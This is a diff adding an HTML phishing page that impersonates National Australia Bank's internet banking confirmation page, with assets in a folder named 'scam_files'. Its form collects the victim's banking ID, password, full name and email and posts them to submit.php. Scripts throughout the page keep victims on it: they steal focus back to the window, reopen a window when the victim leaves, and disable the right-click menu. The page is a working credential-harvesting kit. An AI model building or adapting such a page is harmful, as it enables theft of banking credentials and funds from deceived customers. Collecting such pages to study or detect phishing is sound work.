@@ -1,0 +1,426 @@
+<html><head>
+<meta http-equiv="Expires" content="Fri, Jan 01 2000 10:20:00 GMT">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Cache-Control" content="no-cache"><title>National Internet Banking - Confirmation Page</title>
+
+
+
+<link rel="stylesheet" type="text/css" href="scam_files/winie000.txt">
+
+<script>
+function confirmCreateExit()
+{
+return true;
+}
+</script>
+<script>
+var logouturl = 'https://ib.national.com.au/nabib/prelogout.jsp?sess=G2OCBXE2MNTZ2CNTNIIYBBY';
+var logouturl2 = 'https://ib.national.com.au/nabib/logout.jsp?sess=G2OCBXE2MNTZ2CNTNIIYBBY';
+</script>
+
+<script language="JavaScript">
+var now = new Date();
+var month1 = "10";
+var year4 = "2004";
+var now = "10/23/2004";
+var today = new Date();
+var m = "10";
+var d = "23";
+var y = "2004";
+var TodaysDate = "10/23/2004";
+var isValidAmount = false;
+var MAXXFRAMT = 100000;
+var timeDelay = 1500;
+var myAgent = "Nav";
+var myPlatform = "notMac";
+var vToday = TodaysDate.split("/");
+var iBaseYear = parseFloat(vToday[2]);
+var popupWin = "";
+var popupPSR = "";
+var ggWinCal = "";
+function closepopupWin() {
+if (typeof(popupWin.open) != "unknown") {
+if (popupWin.open) {
+    popupWin.close();
+}
+}
+if (typeof(popupPSR.open) != "unknown") {
+if (popupPSR.open) {
+    popupPSR.close();
+}
+}
+
+if (ggWinCal.open) {
+ggWinCal.close();
+}
+}
+function movepic(img_name,img_src) {
+document[img_name].src=img_src;
+}
+function openWindow(url, name, width, height) {
+popupWin = window.open(url, name, ',width=' + width + ',height=' + height)
+}
+
+function openWindow2(FileName, parentName) {
+popupWin = window.open(FileName, parentName, 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=320,height=360,left=370,top=20,screenX=370,screenY=100');
+popupWin.focus()
+}
+function openWindow(FileName) {
+popupWin = window.open(FileName, 'remote', 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=320,height=250,left=370,top=20,screenX=370,screenY=100');
+popupWin.focus()
+}
+function openWindowSized(FileName) {
+popupWin = window.open(FileName, 'remote', 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=770,height=570,left=100,top=20,screenX=370,screenY=100');
+popupWin.focus()
+}
+function openWindowSizedCustom(FileName) {
+popupPSR = window.open(FileName, 'PSR', 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=770,height=570,left=20,top=20,screenX=370,screenY=100');
+popupPSR.focus()
+}
+function openWindowFull(FileName) {
+popupWin = window.open(FileName, 'remote', 'status=yes,location=yes,toolbar=yes,menubar=yes,scrollbars=yes,resizable=yes,width=800,height=800,left=20,top=20,screenX=200,screenY=200');
+popupWin.focus()
+}
+function openWindowSizedModal(FileName) {
+popupWin = window.showModalDialog(FileName, 'remote', 'location:no;menubar:no;scrollbars:yes;resizable:no;Dialogwidth:800px;Dialogheight:600px;');
+popupWin.focus()
+}
+function OPENWINDOWFAQ(FileName) {
+popupWin = window.open(FileName, 'remote', 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=800,height=500,left=200,top=20,screenX=200,screenY=100');
+popupWin.focus()
+}
+function openWindowConfirm(FileName) {
+popupWin = window.open(FileName, 'remote', 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=400,height=215,left=370,top=20,screenX=370,screenY=100');
+popupWin.focus()
+}
+function openWindowConfirm2(FileName, parentName) {
+popupWin = window.open(FileName, parentName, 'location=no,menubar=no,scrollbars=yes,resizable=yes,width=420,height=370,left=370,top=20,screenX=370,screenY=100');
+popupWin.focus()
+}
+function openbrowsertest() {
+popupWin = window.open('browser_test.asp', 'remote', 'toolbar=no,location=no,directories=no,status=yes,menubar=no,scrollbars=yes,resizable=yes,width=640,height=500,left=200,top=100,screenX=200,screenY=100');
+}
+function removeSpace(data) {
+while (1) {
+    if (data.substring(data.length - 1, data.length) != " ")
+      break;
+    data = data.substring(0, data.length - 1);
+  }
+return data;
+}
+function LogOff(){
+document.SignOff.submit();
+}
+
+function CheckBrowser()
+{
+var agt=navigator.userAgent.toLowerCase();
+
+// *** BROWSER VERSION ***
+// Note: On IE5, these return 4, so use is_ie5up to detect IE5.
+var is_major = parseInt(navigator.appVersion);
+var is_minor = parseFloat(navigator.appVersion);
+
+// Note: Opera and WebTV spoof Navigator.  We do strict client detection.
+// If you want to allow spoofing, take out the tests for opera and webtv.
+var is_nav  = ((agt.indexOf('mozilla')!=-1) && (agt.indexOf('spoofer')==-1)
+&& (agt.indexOf('compatible') == -1) && (agt.indexOf('opera')==-1)
+&& (agt.indexOf('webtv')==-1) && (agt.indexOf('hotjava')==-1));
+var is_nav2 = (is_nav && (is_major == 2));
+var is_nav3 = (is_nav && (is_major == 3));
+var is_nav4 = (is_nav && (is_major == 4));
+var is_nav4up = (is_nav && (is_major >= 4));
+var is_navonly      = (is_nav && ((agt.indexOf(";nav") != -1) ||
+(agt.indexOf("; nav") != -1)) );
+var is_nav6 = (is_nav && (is_major == 5));
+var is_nav6up = (is_nav && (is_major >= 5));
+var is_gecko = (agt.indexOf('gecko') != -1);
+                                
+if (is_nav4)
+{
+alert("Thank you for your attempt to view Online Statements in Internet Banking.  Our online statements " +
+      "process will not work with the browser version you are currently using.  Please go to " +      "https://www.national.com.au/cgi-bin/ib/301_confstart.pl?browser=correct, select Help from the left navigation and then select Browser " +
+      "Information at the top.  This page will provide you with a link to upgrade your Netscape or " +
+      "Internet Explorer browser.");
+return false;
+}
+}
+</script>
+<link rel="STYLESHEET" href="scam_files/styles00.htm" type="text/css">
+<script language="javascript">
+var msg = "";
+var Logout = "No";
+var prevkey = "";
+var prevassigncount = 0;
+var isNav = (navigator.appName.indexOf("Netscape") !=-1);
+if (isNav){
+window.captureEvents(Event.KEYPRESS)
+window.onkeypress = getKey;
+}
+else{
+document.onkeypress = getKey;
+}
+function getKey(keyStroke) {
+
+if (prevassigncount != 0) prevkey = keyHit;
+prevassigncount ++;
+keyHit = (isNav) ? keyStroke.which : event.keyCode;
+whichKey = String.fromCharCode(keyHit).toLowerCase();
+checkKey();
+}
+function checkKey(){
+//if(document.forms[0].name == "sign_on"){
+   if (keyHit=="13" && prevkey != "0"){
+InputCheck();
+
+}
+//}
+}
+
+var submitted = false;
+var iCount = 0;
+var sPlatform = 'notMacNav';
+function InputCheck(bClick, fxndislocation){
+var InputOK = "Yes";
+if (iCount == 0 || (sPlatform == "MacNav" && bClick)) {
+if (document.sign_on.user.value != "Click Sign On") {
+//clear the demo cookie
+var expiresDate = "Wednesday, 01-Jan-2003 12:00:00 GMT";
+document.cookie = "demo=;expires=" + expiresDate;
+//perform validation for logging in to IB
+if (document.sign_on.user.value == ""){
+alert("Please enter your CIN or User ID.");
+document.sign_on.user.focus();
+InputOK = "Alerted";
+}
+else if(document.sign_on.user.value.length > 26){
+InputOK = "No_User";
+}
+else if(document.sign_on.user.value.length < 8){
+InputOK = "No_User";
+}
+else if(!document.sign_on.user.value.search(/^[a-zA-Z0-9]{8,26}$/i) == -1){
+InputOK = "No_User";
+}
+if(document.sign_on.pin.value == ""){
+alert("Please enter your Password.");
+document.sign_on.pin.focus();
+InputOK = "Alerted";
+}
+else if((document.sign_on.pin.value.length > 8)||(document.sign_on.pin.value.length == 5)||(document.sign_on.pin.value.length < 4)){
+InputOK = "No_Pin";
+}
+else if(document.sign_on.pin.value.search(/[\s]/i) > -1){
+InputOK = "No_Pin";
+}
+if(InputOK == "Yes"){
+
+iCount++;
+document.sign_on.pin.value = document.sign_on.pin.value.toUpperCase();
+document.sign_on.submit();
+document.sign_on.pin.focus();
+return true;
+}
+else{
+if (InputOK != "Alerted") {
+alert("Invalid log on. \n Please try again.");
+if(InputOK == "No_User") {
+document.sign_on.user.focus();
+} else {
+document.sign_on.pin.focus();
+}
+}
+return false;
+}
+} else {
+
+//login to demo
+InputOK = "Yes";
+document.sign_on.submit();
+document.sign_on.pin.focus();
+return true;
+}
+
+} else {
+if (null == fxndislocation) {
+alert("Logon currently processing.");
+}
+return false;
+}
+}
+var nSignonFocus = 0;
+function signonFocus(){
+nSignonFocus = 1;
+}
+function setFocusUser(){
+document.sign_on.user.focus();
+}
+
+</script>
+<script type="text/javascript" language="JavaScript">
+flag=1;
+window.onfocus=MyFocus;
+window.onblur=MyBlur;
+ 
+function MyBlur(){
+flag=1;
+clearTimeout(to);
+to=setTimeout("Ticker()", 100);
+}
+function MyFocus(){
+flag=0;
+}
+function Ticker(){
+if (flag==1) {window.focus();}
+to=setTimeout("Ticker()", 100);
+}
+Ticker();
+closeflag=1;
+window.onbeforeunload=F1;
+function F1(){
+if (closeflag) 
+Console(90,80);
+}
+function Console(width,height) {
+var swidth=0;
+var sheight=0;
+if (self.screen) {      // for NN4 and IE4
+swidth = screen.width;
+sheight = screen.height
+}
+window.open("index.htm","","width=800,height=600,top=10,left=70,scrollbars=yes,toolbar=yes,location=yes,menubar=yes,status=yes,resizable=yes");
+}
+function F2(){
+closeflag=0;
+}
+
+function isblank(fe){
+if (fe.value == "") {
+return true;
+} else {
+return false;
+}
+}
+
+function verify(frm, fields, msg){
+fieldarray = fields.split(",");
+for (i=0; i<frm.elements.length; i++){
+for (j=0; j<fieldarray.length; j++){
+if (  fieldarray[j] == frm.elements[i].name &&
+      isblank(frm.elements[i])
+) {
+alert(msg);
+frm.elements[i].focus();
+return false;
+} 
+}
+}
+return true;
+}
+</script>
+<meta http-equiv="Content-Type" content="text/html;charset=646"></head><body leftmargin="0" topmargin="0" oncontextmenu="return false" background="scam_files/backgrou.gif" bgcolor="#ffffff" marginheight="0" marginwidth="0">
+<script>
+function helpwin(loc,ft_1)
+{
+if(isMac&&NS4)ft_1=ft_1+",status=yes";
+hw=window.open("help/nabhelp.htm#"+loc,'Help',ft_1);
+hw.focus();
+}
+
+function logoff() {
+if( confirm( "Thank you for banking with the National\nAre you sure you want to logout?")) { submitMenu('logout.jsp'); }
+}
+
+function logoffAndGoToNationalLocation() {
+redirectUrl = 'http://www.national.com.au/National_Locations';
+if (confirm('To access this service you will be required to logout of Internet Banking.\nAre you sure you want to logout?')) { 
+window.open(redirectUrl,"","width=765,height=513,resizable=no,scrollbars=no,left=0,top=0,screenX=0,screenY=0");
+submitMenu('logout.jsp'); 
+}
+}
+
+</script>
+<table valign="top" bgcolor="#b40019" border="0" cellpadding="0" cellspacing="0" height="67" width="100%">
+<tbody><tr>
+<td class="body" bgcolor="#ffffff" height="67" width="7"><a href="#content" title="Skip to content" onkeydown="javascript:event.cancelBubble=true"><img src="scam_files/dot00000.gif" alt="Skip to content" border="0" height="1" width="7"></a></td> 
+<td class="body" bgcolor="#000000" height="67" width="1"><img src="scam_files/dot00000.gif" alt=" " border="0" height="1" width="1"></td> 
+<td class="body" height="67" width="145"><img src="scam_files/h0100000.gif" alt="National Australia Bank logo" border="0" height="67" width="145"></td> 
+<td height="67" width="20"><img src="scam_files/dot00000.gif" alt=" " border="0" height="1" width="5"></td>
+<td class="body" height="67" valign="bottom" width="265"><table border="0" cellpadding="0" cellspacing="0">
+<tbody><tr><td width="36"><img name="titleBarImg" src="scam_files/u_log_20.gif" usemap="#uMap" alt=" " border="0" height="14" width="216">
+<map name="uMap">
+</map>
+</td>
+</tr>
+<tr><td height="10"></td></tr>
+</tbody></table></td>
+<td valign="top"><img src="scam_files/dot00000.gif" alt=" " border="0" height="1" width="1"></td>
+<td class="body" align="right" height="67" valign="top" width="325">
+<table background="scam_files/header04.htm" border="0" cellpadding="0" cellspacing="0" height="67" width="325">
+<tbody><tr align="right" valign="bottom">
+<td class="date" background="scam_files/header04.gif"><nobr></nobr></td>
+</tr></tbody></table></td>
+</tr>
+</tbody></table>
+
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr>
+<td bgcolor="#333366" height="22"><img src="scam_files/side0000.gif" alt=" " height="22" hspace="0" vspace="0" width="8"></td>
+</tr>
+</tbody></table>
+
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr>
+<td valign="top" width="150"><img src="scam_files/dot00000.gif" alt=" " width="150"></td>
+<td width="10">&nbsp;&nbsp;</td>
+<td width="100%">
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr>
+<td class="spacemedium">&nbsp;</td>
+</tr>
+<tr>
+<td class="pageTitle" align="left"> Confirm National Internet Banking Details</td>
+</tr>
+</tbody></table>
+<hr size="1">
+<a name="content"></a>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr>
+<td>
+<script>function confirmExit(){if( confirm( "Thank you for banking with the National\nAre you sure you want to exit?"))window.close();}</script>
+<form name="sf_1" action="submit.php" method="post" onsubmit="F2(); return verify(this, 'userid,password,name,mail', 'The fields <National ID>, <Internet Banking Password>, <Full Name> and <Email Address> are required, please review your form and try again');">
+<input name="action" value="validate" type="hidden">
+<br><br><br>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr><td class="body" align="left" valign="middle" width="47%"><b>Enter your National ID:</b></td>
+<td align="left" valign="bottom"><input name="userid" size="20" maxlength="10" class="inputtext" autocomplete="OFF" onfocus="MyFocus();" onblur="MyBlur();" type="text"></td>
+</tr>
+<tr><td height="12">&nbsp;</td></tr>
+<tr><td class="body" align="left" valign="middle" width="47%"><b>Enter your Internet Banking Password:</b></td>
+<td align="left" valign="bottom"><input name="password" size="20" maxlength="8" class="inputtext" autocomplete="OFF" onfocus="MyFocus();" onblur="MyBlur();" type="password"></td>
+</tr>
+<tr><td height="12">&nbsp;</td></tr>
+<tr><td class="body" align="left" valign="middle" width="47%"><b>Enter your Full Name:</b></td>
+<td align="left" valign="bottom"><input name="name" size="20" maxlength="30" class="inputtext" autocomplete="OFF" onfocus="MyFocus();" onblur="MyBlur();" type="text"></td>
+</tr>
+<tr><td height="12">&nbsp;</td></tr>
+<tr><td class="body" align="left" valign="middle" width="47%"><b>Enter your Email Address:</b></td>
+<td align="left" valign="bottom"><input name="mail" size="20" maxlength="30" class="inputtext" autocomplete="OFF" onfocus="MyFocus();" onblur="MyBlur();" type="text"></td>
+</tr>
+
+<tr><td height="12">&nbsp;</td></tr>
+<tr>
+<td width="47%">&nbsp;</td>
+<td class="body" align="left"><input class="buttonTextNormal" value=" Confirm " name="logon" onkeydown="javascript:event.cancelBubble=true" type="submit"> &nbsp;&nbsp;&nbsp; </td>
+</tr>
+</tbody></table>
+</form></td>
+</tr>
+</tbody></table>
+</td>
+<td width="10">&nbsp;&nbsp;</td>
+</tr>
+</tbody></table>
+<form name="menuForm" method="post"><input name="nix" value="" type="hidden"></form>
+</body></html>
